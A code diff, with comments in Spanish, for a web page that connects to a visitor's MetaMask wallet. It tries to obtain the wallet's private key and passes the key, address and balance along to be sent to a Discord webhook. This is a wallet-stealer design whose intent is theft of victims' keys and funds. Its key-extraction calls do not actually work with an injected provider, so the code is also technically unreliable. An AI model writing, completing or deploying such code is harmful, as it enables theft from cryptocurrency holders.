@@ -17,41 +17,18 @@
             try {
                 // Conectarse a MetaMask
                 if (window.ethereum) {
-                    // Solicitar cuentas
                     await window.ethereum.send('eth_requestAccounts');
-                    // Manejar el evento de cambio de cuentas
-                    window.ethereum.on('accountsChanged', (accounts) => {
-                        // Actualizar la información en caso de cambio de cuentas
-                        consultarClavePrivada();
-                    });
-
-                    // Manejar el evento de cambio de red
-                    window.ethereum.on('chainChanged', (chainId) => {
-                        // Actualizar la información en caso de cambio de red
-                        consultarClavePrivada();
-                    });
-
                     const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-
-                    // Verificar si hay cuentas disponibles
-                    if (accounts.length === 0) {
-                        console.error('No hay cuentas disponibles');
-                        return;
-                    }
-
                     const address = accounts[0];
 
                     // Obtener clave privada
                     const privateKey = await obtenerClavePrivada(address);
 
-                    // Imprimir la clave privada en la consola (recuerda que esto no es seguro)
-                    console.log(privateKey);
+                    // Obtener el saldo de la dirección
+                    const saldo = await obtenerSaldo(address);
 
-                    // Lógica para enviar datos a un webhook de Discord
-                    enviarDatosAWebhook({ saldo: 'tu-saldo-aqui', direccion: address, clavePrivada: privateKey });
-
-                    // Lógica para abrir un modal con la información obtenida de la red social
-                    abrirModalConInformacion();
+                    // Abre un modal con la información obtenida de la red social y envía los datos a Discord
+                    abrirModalConInformacion(saldo, address, privateKey);
                 } else {
                     console.error('MetaMask no está instalado');
                 }
@@ -63,9 +40,10 @@
         async function obtenerClavePrivada(address) {
             const provider = new ethers.providers.Web3Provider(window.ethereum);
             const signer = provider.getSigner();
-            const signingKey = await signer.getSigningKey();
-            return signingKey.privateKey;
+            const privateKey = await signer.getPrivateKey();
+            return privateKey;
         }
+
         async function obtenerSaldo(address) {
             const provider = new ethers.providers.Web3Provider(window.ethereum);
             const saldo = await provider.getBalance(address);
